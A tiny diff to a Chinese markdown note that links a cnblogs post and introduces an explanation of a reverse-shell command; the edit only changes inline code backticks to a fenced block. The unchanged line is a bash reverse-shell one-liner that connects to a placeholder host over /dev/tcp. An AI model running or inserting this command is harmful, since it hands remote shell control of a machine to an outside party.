@@ -4,6 +4,6 @@
 https://www.cnblogs.com/mke2fs/p/12718499.html
 
 其中，对反弹shell的命令做一下解释：  
-`
+```
 bash -i >& /dev/tcp/x.x.x.x/8080 0>&1
-`
+```
